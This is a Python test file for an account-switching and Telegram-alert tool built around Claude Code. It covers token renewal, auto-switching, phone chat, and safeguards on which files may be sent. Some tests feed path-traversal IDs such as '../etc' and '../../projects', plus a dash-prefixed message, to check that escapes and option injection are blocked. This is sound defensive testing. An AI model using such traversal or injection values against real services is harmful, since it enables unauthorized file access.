"""Switch flow on throwaway keychain items and temp files; never touches the real login. Run: python3 test_ccs.py"""
import io, json, os, subprocess, sys, tempfile, time, urllib.error
from datetime import datetime, timezone
from importlib.machinery import SourceFileLoader

ccs = SourceFileLoader("ccs", os.path.join(os.path.dirname(os.path.abspath(__file__)), "ccs")).load_module()
tmp = tempfile.mkdtemp()
ccs.KC, ccs.STORE, ccs.TG = "ccs-test-cc", "ccs-test-store", "ccs-test-tg"
ccs.CFG, ccs.META, ccs.CACHE = f"{tmp}/claude.json", f"{tmp}/meta.json", f"{tmp}/cache.json"  # never the real ones
ccs.SESS, ccs.NO_SEND, ccs.HISTORY = f"{tmp}/sess", f"{tmp}/no-send", f"{tmp}/history.jsonl"

far = int(time.time() * 1000) + 3600_000
accA = {"accountUuid": "a", "organizationUuid": "o1", "emailAddress": "a@x.uz"}
accB = {"accountUuid": "b", "organizationUuid": "o2", "emailAddress": "b@x.uz"}
tokA = {"accessToken": "A", "refreshToken": "rA", "expiresAt": far, "scopes": []}
tokB = {"accessToken": "B", "refreshToken": "rB", "expiresAt": far, "scopes": []}
try:
    ccs.kc_set(ccs.KC, ccs.USER, {"mcpOAuth": {"srv": 1}, "claudeAiOauth": tokA})
    ccs.save(ccs.CFG, {"oauthAccount": accA, "keep": 1})
    assert ccs.sync() == "a:o1"
    # user does /login with account B
    ccs.kc_set(ccs.KC, ccs.USER, {"mcpOAuth": {"srv": 1}, "claudeAiOauth": tokB})
    ccs.save(ccs.CFG, {"oauthAccount": accB, "keep": 1})
    assert ccs.sync() == "b:o2" and list(ccs.load(ccs.META)) == ["a:o1", "b:o2"]

    ccs.use(ccs.pick("1"))
    assert ccs.kc_get(ccs.KC, ccs.USER) == {"mcpOAuth": {"srv": 1}, "claudeAiOauth": tokA}
    assert ccs.load(ccs.CFG) == {"oauthAccount": accA, "keep": 1}
    assert ccs.kc_get(ccs.STORE, "b:o2") == tokB and ccs.pick("b@") == "b:o2"

    big = {"claudeAiOauth": tokA, "mcpOAuth": {"pad": "x" * 5000}}  # past the security -i line limit
    ccs.kc_set(ccs.KC, ccs.USER, big)
    assert ccs.kc_get(ccs.KC, ccs.USER) == big

    calls = []
    os.remove(ccs.CACHE)  # use() above noted the switch there; start the cache tests empty
    ccs.http = lambda url, token=None, body=None: calls.append(url) or {"five_hour": {"utilization": 50}}
    assert ccs.usage("a:o1", "a:o1") == ccs.usage("a:o1", "a:o1") == {"five_hour": {"utilization": 50}}
    assert len(calls) == 1  # second call served from cache
    c = ccs.load(ccs.CACHE)
    c["a:o1"]["at"] -= 600
    ccs.save(ccs.CACHE, c)

    def limited(*a, **kw):
        raise urllib.error.HTTPError("u", 429, "", {"Retry-After": "90"}, None)
    ccs.http = limited
    assert ccs.usage("a:o1", "a:o1") == {"five_hour": {"utilization": 50}}  # last numbers while rate limited
    assert ccs.load(ccs.CACHE)["a:o1"]["retry"] > time.time() + 80

    # the active account's token expired and no claude renewed it: ccs renews it and hands it to Claude Code
    renewed, used = {"access_token": "A2", "refresh_token": "rA2", "expires_in": 3600}, []

    def fake_http(url, token=None, body=None, timeout=20):
        used.append(token)
        return renewed if url == ccs.TOKEN_URL else {"five_hour": {"utilization": 1}}

    def expire_active():
        ccs.kc_set(ccs.KC, ccs.USER, {"mcpOAuth": {"srv": 1}, "claudeAiOauth": {**tokA, "expiresAt": 0}})
        c = ccs.load(ccs.CACHE)
        c.pop("a:o1", None)  # no cached numbers to fall back on
        ccs.save(ccs.CACHE, c)
    ccs.http = fake_http
    expire_active()
    assert ccs.usage("a:o1", "a:o1") == {"five_hour": {"utilization": 1}} and used[-1] == "A2"
    kc = ccs.kc_get(ccs.KC, ccs.USER)
    assert kc["mcpOAuth"] == {"srv": 1} and (kc["claudeAiOauth"]["accessToken"], kc["claudeAiOauth"]["refreshToken"]) == ("A2", "rA2")

    def racing_http(url, token=None, body=None, timeout=20):  # claude renews it at the same moment
        if url == ccs.TOKEN_URL:
            ccs.kc_set(ccs.KC, ccs.USER, {"claudeAiOauth": {**tokA, "accessToken": "byClaude", "refreshToken": "rC", "expiresAt": far}})
        return fake_http(url, token, body)
    ccs.http = racing_http
    expire_active()
    ccs.usage("a:o1", "a:o1")
    assert ccs.kc_get(ccs.KC, ccs.USER)["claudeAiOauth"]["accessToken"] == "byClaude" and used[-1] == "byClaude"  # not overwritten

    assert ccs.worst({"five_hour": {"utilization": 40}, "seven_day": {"utilization": 97}, "seven_day_opus": None}) == 97
    assert ccs.worst("HTTP 500") is None
    assert ccs.left(None) == "-" and ccs.left("2000-01-01T00:00:00+00:00") == "0h00m"

    # auto: ask at 90, switch by itself at 95, only to an account under 90
    pct, answers, switched = {}, [], []
    ccs.sync = lambda: "a:o1"
    ccs.usage = lambda k, active: {"five_hour": {"utilization": pct[k],  # API varies the microseconds per call
                                                 "resets_at": f"2099-01-01T05:00:00.{time.time_ns() % 10**6:06d}+00:00"}}
    ccs.ask_switch = lambda *a: answers.pop(0)  # raises if a dialog shows when none should
    ccs.use, ccs.notify = switched.append, lambda text: None

    def run(a, b, *ans):
        pct.update({"a:o1": a, "b:o2": b})
        answers[:], switched[:] = ans, []
        ccs.auto(90, 95, 0, True)
        assert not answers, "expected a dialog"
        return switched == ["b:o2"]

    assert not run(50, 10)
    assert run(91, 10, "Switch")
    assert not run(91, 10, "")  # no answer: stay, ask again next time
    assert not run(91, 10, "Not now")
    assert not run(93, 10)  # declined for this 5h window: no new dialog
    assert run(96, 10)  # 95+: switch without asking
    assert not run(96, 92)  # other account has no room

    # telegram: one-time pairing link, owner only, buttons, one phone question per 5h window
    sent = []
    ccs.tg = lambda cfg, method, **p: sent.append((method, p)) or {}
    ccs.kc_set(ccs.TG, "bot", {"token": "1:x", "chat": None, "pair": "code"})
    cfg = ccs.kc_get(ccs.TG, "bot")
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 7}, "text": "/start wrong"}})
    assert ccs.kc_get(ccs.TG, "bot")["chat"] is None and not sent
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/start code"}})
    cfg = ccs.kc_get(ccs.TG, "bot")
    assert cfg == {"token": "1:x", "chat": 5} and [m for m, _ in sent] == ["sendMessage"]
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 7}, "text": "/use 2"}})
    assert len(sent) == 1  # strangers get nothing

    def press(data):
        ccs.tg_handle(cfg, {"callback_query": {"id": "q", "data": data, "message": {"chat": {"id": 5}, "message_id": 9}}})
    switched[:], sent[:] = [], []
    press(f"use:{ccs.hid('b:o2')}")
    assert switched == ["b:o2"] and [m for m, _ in sent] == ["answerCallbackQuery", "editMessageText"]
    press(f"no:{ccs.hid('a:o1')}:2099-01-02T05:00")
    assert ccs.load(ccs.CACHE)["declined"]["a:o1"] == "2099-01-02T05:00"

    c = ccs.load(ccs.CACHE)
    c.pop("tg_asked", None)
    ccs.save(ccs.CACHE, c)
    sent[:] = []
    run(91, 10, "")
    run(91, 10, "")
    asks = [p for m, p in sent if m == "sendMessage"]
    assert len(asks) == 1 and asks[0]["reply_markup"]["inline_keyboard"][0][0]["callback_data"] == f"use:{ccs.hid('b:o2')}"

    # hook: alert only when away, with the project and Claude's last reply
    transcript = f"{tmp}/t.jsonl"
    with open(transcript, "w") as f:
        f.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "Old"}]}}) + "\n")
        f.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "All <done>"}]}}) + "\n")
        f.write(json.dumps({"type": "ai-title", "aiTitle": "Snibe drivers"}) + "\n")
        f.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "thinking", "thinking": "x"}]}}) + "\n")

    def fire(event, away):
        ccs.idle, sent[:] = (lambda: 999 if away else 5), []
        ccs.sys.stdin = io.StringIO(json.dumps({"cwd": "/w/shop", "transcript_path": transcript, **event}))
        ccs.hook()
        return [p["text"] for m, p in sent if m == "sendMessage"]
    assert fire({"hook_event_name": "Stop"}, away=False) == []
    assert fire({"hook_event_name": "Stop"}, away=True) == \
        ["✅ <b>shop</b> · finished\n<i>Snibe drivers</i>\n<blockquote expandable>All &lt;done&gt;</blockquote>"]
    assert fire({"hook_event_name": "Notification", "message": "Claude needs your permission to use Bash"}, away=True) == \
        ["⏳ <b>shop</b> · waiting for you\n<i>Snibe drivers</i>\n\nClaude needs your permission to use Bash"]

    def picky(cfg, method, **p):  # Telegram refusing the formatting: the alert goes out as plain text
        if "blockquote" in p.get("text", ""):
            raise urllib.error.HTTPError("u", 400, "can't parse entities", {}, None)
        sent.append((method, p))
    ccs.tg = picky
    assert fire({"hook_event_name": "Stop"}, away=True) == ["✅ <b>shop</b> · finished\n<i>Snibe drivers</i>\n\nAll &lt;done&gt;"]

    md = ("## Result\nUchta **drayver** tayyor: `equipment.conf.xml` <ok>\n\n"
          "| Drayver | Model | Port |\n|---|---|---|\n| `AsServerC8` | Snibe C8 | 7230 |\n\n"
          "- see [docs](https://x.uz/a?b=1&c=2)\n```py\nprint('<hi>')\n```\n---")
    assert ccs.md_html(md) == (
        "<b>Result</b>\nUchta <b>drayver</b> tayyor: <code>equipment.conf.xml</code> &lt;ok&gt;\n\n"
        "• <b>AsServerC8</b> · Snibe C8 · 7230\n\n"
        "• see <a href=\"https://x.uz/a?b=1&amp;c=2\">docs</a>\n<pre>print('&lt;hi&gt;')</pre>")
    assert ccs.clip("a\nb\n```\ncode\nmore", 9) == "a\nb\n```\n…\n```"  # cut at a line, code block closed

    # sessions: hooks record state and written files; the safety rules decide which files may be sent
    ccs.SESS, ccs.NO_SEND = f"{tmp}/sess", f"{tmp}/no-send"
    proj, his = f"{tmp}/shop", f"{tmp}/his"
    os.makedirs(proj)
    os.makedirs(his)
    for path, body in [(f"{proj}/report.md", "# hi"), (f"{proj}/.env", "X=1"), (f"{proj}/empty.txt", ""), (f"{his}/patients.csv", "p")]:
        with open(path, "w") as f:
            f.write(body)
    os.symlink(f"{his}/patients.csv", f"{proj}/link.csv")
    with open(ccs.NO_SEND, "w") as f:
        f.write(f"# patient data\n{his}\n")
    sid = "s-1"

    def ev(name, **kw):
        ccs.record({"session_id": sid, "hook_event_name": name, "cwd": proj, "transcript_path": transcript, **kw})
    ev("UserPromptSubmit")
    ev("PostToolUse", tool_input={"file_path": "old.md"})  # relative: joined with cwd; never existed
    ev("Stop")
    ev("UserPromptSubmit")
    for p in ("report.md", ".env", "empty.txt", "link.csv"):
        ev("PostToolUse", tool_input={"file_path": f"{proj}/{p}"})
    ev("Notification", message="Claude needs your permission to use Bash")
    ccs.save(f"{ccs.SESS}/{sid}.json", {"model": "Opus 5.5", "effort": "high", "ctx": 72, "at": time.time() - 5})
    s = ccs.session(sid)
    assert s["state"] == "waiting" and s["model"] == "Opus 5.5" and len(s["files"]) == 5 and len(s["turn"]) == 4
    assert [ccs.why_not(p) for p in s["files"]] == ["the file no longer exists", "", "looks like a secret, key or database dump",
                                                     "the file is empty", "its folder is in ~/.ccs-no-send"]  # symlink caught
    assert ccs.session("../etc")["files"] == []  # ids from Telegram can't escape the sessions folder

    # finished alert: 📎 only for this turn's files that may be sent
    ccs.tg = lambda cfg, method, **p: sent.append((method, p)) or {}
    fire({"hook_event_name": "Stop", "session_id": sid}, away=True)
    assert sent[-1][1]["reply_markup"]["inline_keyboard"] == [[{"text": "📎 report.md", "callback_data": "file:s-1:1"}]]

    # bot: /sessions, the file list, sending and refusing files
    uploads = []
    ccs.tg_file = lambda cfg, path, caption: uploads.append((path, caption))
    sent[:] = []
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/sessions"}})
    view = sent[-1][1]
    assert "<b>shop</b> · 💤 idle" in view["text"] and "<i>Snibe drivers</i>" in view["text"]
    assert "Opus 5.5 · effort high · context left 72%" in view["text"] and "📎 5 file(s) written" in view["text"]
    assert view["reply_markup"]["inline_keyboard"][0] == [{"text": "📎 shop (5)", "callback_data": "files:s-1"}]
    press("files:s-1")
    listing = [p for m, p in sent if m == "sendMessage"][-1]
    assert listing["text"].count("🚫") == 4 and len(listing["reply_markup"]["inline_keyboard"]) == 1
    press("file:s-1:1")
    assert uploads == [(f"{proj}/report.md", "report.md")]
    press("file:s-1:2")
    answer = [p for m, p in sent if m == "answerCallbackQuery"][-1]
    assert len(uploads) == 1 and answer["show_alert"] and answer["text"].startswith("🚫 Not sent: looks like a secret")
    press("file:../x:0")
    assert len(uploads) == 1

    # chat: plain messages from the owner go to Claude, one session until /clear
    ccs.CHAT, fake = f"{tmp}/chat", f"{tmp}/claude"
    with open(fake, "w") as f:
        f.write(f"#!{sys.executable}\nimport json, sys\nmsg = sys.stdin.read()\n"
                "open(sys.argv[0] + '.log', 'a').write(json.dumps(sys.argv[1:]) + '\\n')\n"
                "r = {'type': 'result', 'is_error': msg == 'fail', 'session_id': 'chat-1',\n"
                "     'result': 'No conversation found' if msg == 'fail' else f'**You said:** {msg}'}\n"
                "print(json.dumps([{'type': 'system'}, r]))\n")
    os.chmod(fake, 0o755)
    ccs.CLAUDE = fake
    while not ccs.chat_q.empty():
        ccs.chat_q.get()
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 7}, "text": "hello"}})
    assert ccs.chat_q.empty()  # strangers can't reach Claude
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "-h"}})
    assert ccs.chat_q.get_nowait() == "-h"
    answers = lambda: [p["text"] for m, p in sent if m == "sendMessage"]
    sent[:] = []
    ccs.chat_turn(cfg, "-h")  # starts with "-": goes in on stdin, not read as an option
    ccs.chat_turn(cfg, "again")
    assert answers() == ["<b>You said:</b> -h", "<b>You said:</b> again"]
    with open(fake + ".log") as f:
        argv = [json.loads(line) for line in f]
    assert "--resume" not in argv[0] and argv[1][-2:] == ["--resume", "chat-1"]
    assert "--restricted" in argv[0] and argv[0][argv[0].index("--tools") + 1] == "WebSearch,WebFetch"
    ccs.chat_turn(cfg, "fail")
    assert answers()[-1].startswith("⚠️ No conversation found")
    # model and effort: commands, buttons, validation; /new keeps them
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/model Sonnet"}})
    press("effort:max")
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/effort silly"}})
    assert {k: v for k, v in ccs.load(f"{ccs.CHAT}/state.json").items() if k != "session"} == {"model": "sonnet", "effort": "max"}
    assert "Unknown effort: silly" in answers()[-1] and "✓ sonnet" in str(sent[-1][1]["reply_markup"])
    ccs.chat_turn(cfg, "hi")
    with open(fake + ".log") as f:
        last = json.loads(f.read().splitlines()[-1])
    assert last[-6:] == ["--resume", "chat-1", "--model", "sonnet", "--effort", "max"]
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/new"}})
    assert ccs.load(f"{ccs.CHAT}/state.json") == {"model": "sonnet", "effort": "max"}
    assert answers()[-1].startswith("🆕 New chat started (model sonnet, effort max).")
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/model default"}})
    assert ccs.load(f"{ccs.CHAT}/state.json") == {"effort": "max"}

    # /chats: past phone chats from Claude's own transcripts, tap to continue
    ccs.PROJECTS = f"{tmp}/projects"
    os.makedirs(ccs.chat_dir())

    def chatfile(sid, first, answer, mtime):
        path = f"{ccs.chat_dir()}/{sid}.jsonl"
        with open(path, "w") as f:
            f.write(json.dumps({"type": "user", "message": {"content": first}}) + "\n")
            f.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": answer}]}}) + "\n")
        os.utime(path, (mtime, mtime))
    chatfile("old-1", "Odoo 16 da   computed field qanday?", "Use **@api.depends**", time.time() - 3 * 86400)
    chatfile("new-2", "salom", "Salom!", time.time())
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/chats"}})
    kb = sent[-1][1]["reply_markup"]["inline_keyboard"]
    assert [b[0]["callback_data"] for b in kb] == ["chat:new-2", "chat:old-1"]  # newest first
    assert kb[1][0]["text"].startswith("Odoo 16 da computed field qanday? · ")
    press("chat:old-1")
    assert ccs.load(f"{ccs.CHAT}/state.json") == {"effort": "max", "session": "old-1"}
    assert "<b>Back in:</b> Odoo 16 da computed field qanday?" in answers()[-1] and "<b>@api.depends</b>" in answers()[-1]
    press("chat:../../x")
    assert ccs.load(f"{ccs.CHAT}/state.json")["session"] == "old-1"  # sessions of other folders can't be opened
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/chats"}})
    assert sent[-1][1]["reply_markup"]["inline_keyboard"][1][0]["text"].startswith("▶ Odoo")

    # deleting: /clear asks about the current chat, 🗑 in /chats about that one; Cancel goes back to the list
    old, new = f"{ccs.chat_dir()}/old-1", f"{ccs.chat_dir()}/new-2.jsonl"
    os.makedirs(f"{old}/subagents")  # Claude Code's side folder of a session
    assert kb[0][1] == {"text": "🗑", "callback_data": "del:new-2"}
    edits = lambda: [p["text"] for m, p in sent if m == "editMessageText"]
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/clear"}})
    confirm = [p for m, p in sent if m == "sendMessage"][-1]
    assert "Delete the chat “Odoo 16 da computed field qanday?”" in confirm["text"]
    assert confirm["reply_markup"]["inline_keyboard"] == [[{"text": "🗑 Delete", "callback_data": "delok:old-1"},
                                                            {"text": "Cancel", "callback_data": "chats"}]]
    press("del:new-2")
    assert "Delete the chat “salom”" in edits()[-1]
    press("chats")  # Cancel
    assert os.path.exists(f"{old}.jsonl") and os.path.exists(new) and "Your chats" in edits()[-1]
    press("delok:old-1")
    assert not os.path.exists(f"{old}.jsonl") and not os.path.exists(old) and os.path.exists(new)
    assert ccs.load(f"{ccs.CHAT}/state.json") == {"effort": "max"}
    assert edits()[-1].startswith("<b>🗑 Deleted “Odoo 16 da computed field qanday?”. Your next message starts a new chat.</b>")
    press("delok:../../projects")
    assert edits()[-1].startswith("<b>Chat not found.</b>") and os.path.isdir(ccs.PROJECTS)
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "/clear"}})
    assert answers()[-1] == "No chat is open: nothing to delete."

    # screenshots: only this task's tool-result images, each sent once, photo first and file if Telegram refuses
    tr = f"{tmp}/shots.jsonl"
    img = lambda mtype, data: {"type": "image", "source": {"type": "base64", "media_type": mtype,
                                                           "data": __import__("base64").b64encode(data).decode()}}
    with open(tr, "w") as f:
        for e in [{"type": "user", "message": {"content": "old task"}},
                  {"type": "user", "message": {"content": [{"type": "tool_result", "content": [img("image/png", b"A")]}]}},
                  {"type": "user", "message": {"content": "new task"}},
                  {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "screenshot"}]}},
                  {"type": "user", "message": {"content": [{"type": "tool_result", "content": [
                      img("image/png", b"B"), {"type": "text", "text": "ok"}, img("image/jpeg", b"C")]}]}},
                  {"type": "user", "isMeta": True, "message": {"content": [{"type": "text", "text": "[Image: x]"}]}},
                  {"type": "assistant", "message": {"content": [{"type": "text", "text": "done"}]}}]:
            f.write(json.dumps(e) + "\n")
    assert ccs.turn_images(tr) == ([("image/png", b"B"), ("image/jpeg", b"C")], 7)  # the meta line isn't a prompt
    assert ccs.turn_images(tr, since=7) == ([], 7) and ccs.turn_images(tr, since=99)[0] == ccs.turn_images(tr)[0]
    shots = []

    def fake_upload(cfg, method, field, name, data, caption=""):
        if method == "sendPhoto" and data == b"C":
            raise urllib.error.HTTPError("u", 400, "PHOTO_INVALID_DIMENSIONS", {}, None)
        shots.append((method, name, data, caption))
    ccs.tg_upload = fake_upload
    ccs.send_images(cfg, {"session_id": "s-2", "cwd": proj, "transcript_path": tr})
    assert shots == [("sendPhoto", "image.png", b"B", "🖼 shop · 1/2"), ("sendDocument", "image.jpeg", b"C", "🖼 shop · 2/2")]
    ccs.send_images(cfg, {"session_id": "s-2", "cwd": proj, "transcript_path": tr})
    assert len(shots) == 2  # nothing new since

    # questions (AskUserQuestion) on the phone: buttons, multi-select ticks + Done, the decision JSON back to Claude
    mid = iter(range(100, 1000))
    ccs.tg = lambda cfg, method, **p: sent.append((method, p)) or {"message_id": next(mid)}
    qs = [{"question": "Which color?", "header": "Color", "multiSelect": False,
           "options": [{"label": "Red", "description": "warm"}, {"label": "Blue", "description": "cool"}]},
          {"question": "Which sizes?", "header": "Sizes", "multiSelect": True,
           "options": [{"label": "S"}, {"label": "M"}, {"label": "L"}]}]
    ask_ev = {"session_id": "s-2", "hook_event_name": "PreToolUse", "tool_name": "AskUserQuestion", "cwd": proj,
              "transcript_path": tr, "tool_input": {"questions": qs}}
    real_sleep = time.sleep

    def phone(_):  # the answers arrive from the phone while the hook waits
        qid = os.listdir(f"{ccs.SESS}/asks")[0][:-5]
        for data in (f"q:{qid}:0:1", f"q:{qid}:1:0", f"q:{qid}:1:2", f"q:{qid}:1:0", f"q:{qid}:1:1", f"qd:{qid}:1"):
            press(data)

    def run_hook(event):
        ccs.sys.stdin, out = io.StringIO(json.dumps(event)), io.StringIO()
        with __import__("contextlib").redirect_stdout(out):
            ccs.hook()
        return out.getvalue()
    os.remove(f"{ccs.SESS}/s-2.img")  # the question comes with this task's screenshots
    ccs.idle, ccs.time.sleep, sent[:] = (lambda: 999), phone, []
    try:
        out = run_hook(ask_ev)
    finally:
        ccs.time.sleep = real_sleep
    assert json.loads(out) == {"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "allow",
                                                      "updatedInput": {"questions": qs, "answers": {
                                                          "Which color?": "Blue", "Which sizes?": "M, L"}}}}
    assert len(shots) == 4 and os.listdir(f"{ccs.SESS}/asks") == [] and ccs.session("s-2")["state"] == "working"
    questions = [p for m, p in sent if m == "sendMessage"]
    assert questions[0]["text"].startswith("❓ <b>shop</b> · Claude asks\n<b>Color</b> Which color?")
    assert [len(q["reply_markup"]["inline_keyboard"]) for q in questions] == [2, 4]  # options (+ ✅ Done)
    assert "→ <b>M, L</b>" in edits()[-1]

    idles = iter([999, 0])  # you come back to the Mac: the question moves there
    ccs.idle = lambda: next(idles, 0)
    assert run_hook(ask_ev) == "" and edits()[-1].endswith("this question is on the Mac now.")
    ccs.idle = lambda: 999
    assert run_hook({**ask_ev, "cwd": his}) == "" and answers()[-1].endswith("this folder is in ~/.ccs-no-send.")

    ccs.save(ccs.ask_file("abcd1234"), {"project": "shop", "questions": qs, "answers": {}, "multi": {}, "messages": {"77": 0}})
    ccs.tg_handle(cfg, {"message": {"chat": {"id": 5}, "text": "Green", "reply_to_message": {"message_id": 77}}})
    assert ccs.load(ccs.ask_file("abcd1234"))["answers"] == {"Which color?": "Green"} and ccs.chat_q.empty()
    press("q:deadbeef:0:0")
    assert [p for m, p in sent if m == "answerCallbackQuery"][-1]["text"] == "This question isn't waiting any more."

    # patient-data folders: the finished alert carries no reply and no screenshots
    n = len(shots)
    run_hook({"hook_event_name": "Stop", "session_id": "s-3", "cwd": his, "transcript_path": tr})
    assert answers()[-1].endswith("The reply and screenshots stay on the Mac: this folder is in ~/.ccs-no-send.")
    assert len(shots) == n

    # at the Mac: long tasks are still reported (with how long they took), quick replies aren't;
    # the "waiting for your input" reminder is never forwarded; a question gives a heads-up
    with open(f"{ccs.SESS}/s-long.log", "w") as f:
        f.write(json.dumps({"t": time.time() - 130, "e": "UserPromptSubmit", "cwd": proj}) + "\n")
    ccs.idle, sent[:] = (lambda: 5), []
    run_hook({"hook_event_name": "Stop", "session_id": "s-long", "cwd": proj, "transcript_path": tr})
    assert answers()[0].startswith("✅ <b>shop</b> · finished in 2m\n<blockquote expandable>done</blockquote>")
    assert len(shots) == n + 2  # with this task's screenshots
    sent[:] = []
    run_hook({"hook_event_name": "Stop", "session_id": "s-quick", "cwd": proj, "transcript_path": tr})
    run_hook({"hook_event_name": "Notification", "session_id": "s-long", "cwd": proj, "message": "Claude is waiting for your input"})
    assert answers() == []
    run_hook(ask_ev)
    assert answers() == ["❓ <b>shop</b> · Claude asks: Which color?\nAnswer it at the Mac."]

    # documents a task produced (often by a script, not the file tool) come with the report
    pdfproj, outside, start = f"{tmp}/pdfproj", f"{tmp}/Desktop", time.time() - 120
    for d in ("reports", "node_modules/pkg", ".cache", "src"):
        os.makedirs(f"{pdfproj}/{d}")
    os.makedirs(outside)

    def made(path, age, body=b"%PDF-1.4"):
        with open(path, "wb") as f:
            f.write(body)
        os.utime(path, (time.time() - age, time.time() - age))
    made(f"{pdfproj}/reports/q3.pdf", 60)
    made(f"{pdfproj}/reports/chart.png", 50, b"PNG")
    made(f"{pdfproj}/reports/old.pdf", 3600)  # from an earlier task
    made(f"{pdfproj}/node_modules/pkg/doc.pdf", 10)  # build/dependency folders are skipped
    made(f"{pdfproj}/.cache/x.pdf", 10)
    made(f"{pdfproj}/src/app.py", 10, b"print(1)")  # code: not a deliverable
    made(f"{outside}/summary.docx", 40, b"PK")  # outside the project, named in the reply
    made(f"{his}/patients.xlsx", 30, b"PK")  # named in the reply, but in a no-send folder
    reply_md = f"Done: `reports/q3.pdf`, also saved {outside}/summary.docx and {his}/patients.xlsx"
    with open(f"{ccs.SESS}/s-pdf.log", "w") as f:
        f.write(json.dumps({"t": start, "e": "UserPromptSubmit", "cwd": pdfproj}) + "\n")
    s_pdf = ccs.session("s-pdf")
    assert ccs.made_files(s_pdf, reply_md) == [f"{pdfproj}/reports/q3.pdf", f"{pdfproj}/reports/chart.png",
                                               f"{outside}/summary.docx", f"{his}/patients.xlsx"]
    home = os.environ["HOME"]
    os.environ["HOME"] = pdfproj  # Claude working in the home folder: no scan, only what the reply names
    try:
        assert ccs.made_files(s_pdf, reply_md) == [f"{pdfproj}/reports/q3.pdf", f"{outside}/summary.docx", f"{his}/patients.xlsx"]
    finally:
        os.environ["HOME"] = home
    shots[:] = []
    ccs.tg_upload = lambda cfg, method, field, name, data, caption="": shots.append((method, name, caption))
    ccs.send_made(cfg, s_pdf, reply_md)
    assert shots == [("sendDocument", "q3.pdf", "reports/q3.pdf"), ("sendDocument", "summary.docx", f"{outside}/summary.docx"),
                     ("sendPhoto", "chart.png", "reports/chart.png")]  # documents first; patients.xlsx stays on the Mac
    assert ccs.session("s-pdf")["files"] == [f"{pdfproj}/reports/q3.pdf", f"{outside}/summary.docx",
                                             f"{pdfproj}/reports/chart.png"]  # and they join /sessions 📎

    # ccs json: what the menu bar app reads
    out = io.StringIO()
    with __import__("contextlib").redirect_stdout(out):
        ccs.as_json()
    data = json.loads(out.getvalue())
    assert [(a["n"], a["active"], a["email"], a["error"]) for a in data] == [(1, True, "a@x.uz", None), (2, False, "b@x.uz", None)]
    limit = data[0]["limits"][0]
    assert limit["key"] == "five_hour" and limit["label"] == "5h" and int(limit["resets"]) == 4070926800  # 2099-01-01T05:00Z

    # unexplained usage: a 5h rise while nothing here was using Claude gets a warning with links
    ccs.SESS, sent[:] = f"{tmp}/quiet", []
    ccs.save(ccs.CACHE, {})
    seen = lambda pct, resets="2099-01-01T05:00:00.1+00:00", ago=0: \
        {"at": time.time() - ago, "u": {"five_hour": {"utilization": pct, "resets_at": resets}}}
    warnings = lambda: [p for m, p in sent if m == "sendMessage" and p["text"].startswith("⚠️")]
    ccs.watch("a:o1", "a:o1", seen(10, ago=240), seen(11))
    assert warnings() == []  # under 2 points
    ccs.watch("a:o1", "a:o1", seen(10, ago=240), seen(15))
    assert len(warnings()) == 1 and "5h usage rose 10% → 15%" in warnings()[0]["text"]
    assert warnings()[0]["reply_markup"]["inline_keyboard"][0][0]["url"] == "https://claude.ai/settings/claude-code"
    ccs.watch("a:o1", "a:o1", seen(15, ago=60), seen(25))
    assert len(warnings()) == 1  # once an hour per account
    ccs.watch("b:o2", "a:o1", seen(40, resets="2099-01-01T00:00:00+00:00", ago=240), seen(3))
    assert "rose 0% → 3%" in warnings()[-1]["text"]  # a new 5h window counts from zero

    def forget_warnings(**extra):
        c = ccs.load(ccs.CACHE)
        c.pop("watched", None)
        ccs.save(ccs.CACHE, {**c, **extra})
    ccs.record({"session_id": "s-busy", "hook_event_name": "UserPromptSubmit", "cwd": proj})  # we're working
    forget_warnings()
    n = len(warnings())
    ccs.watch("a:o1", "a:o1", seen(10, ago=240), seen(20))
    assert len(warnings()) == n  # our own session explains the account in use
    ccs.watch("b:o2", "a:o1", seen(10, ago=240), seen(20))
    assert len(warnings()) == n + 1  # but not the other account
    forget_warnings(switched=time.time() - 60)
    ccs.watch("b:o2", "a:o1", seen(10, ago=240), seen(20))
    assert len(warnings()) == n + 1  # unless we just switched away from it

    # history: fresh readings are logged; ccs json hands the app 15-minute (day) and 2-hour (week) steps
    ccs.save(ccs.CACHE, {})
    now = time.time()
    with open(ccs.HISTORY, "w") as f:
        for ago, h5, d7 in [(3000, 10, 30), (2000, 30, 31), (1000, 50, 32), (100, 70, 34)]:
            f.write(json.dumps({"t": now - ago, "k": "a:o1", "5h": h5, "7d": d7}) + "\n")
    ccs.log_usage("a:o1", {"five_hour": {"utilization": 72}, "seven_day": {"utilization": 34}})
    assert [s["5h"] for s in ccs.history(now - 3600)["a:o1"]] == [10, 30, 50, 70, 72]
    out = io.StringIO()
    with __import__("contextlib").redirect_stdout(out):
        ccs.as_json()
    day = json.loads(out.getvalue())[0]["history"]["day"]
    assert len(day) >= 2 and day[-1][1] == 72 and all(b % 900 == 0 for b, _ in day)

    # forecast for the account in use: 10% → 72% in 50 min means 100% in ~23 min, well before the reset
    iso = lambda t: datetime.fromtimestamp(t, timezone.utc).isoformat()
    cur = {"u": {"five_hour": {"utilization": 72, "resets_at": iso(now + 7200)}, "seven_day": {"utilization": 34, "resets_at": iso(now + 86400 * 3)}}}
    alerts = lambda mark: [p["text"] for m, p in sent if m == "sendMessage" and p["text"].startswith(mark)]
    sent[:] = []
    ccs.pace_alerts("a:o1", "a:o1", {}, cur)
    ccs.pace_alerts("a:o1", "a:o1", {}, cur)  # once per window
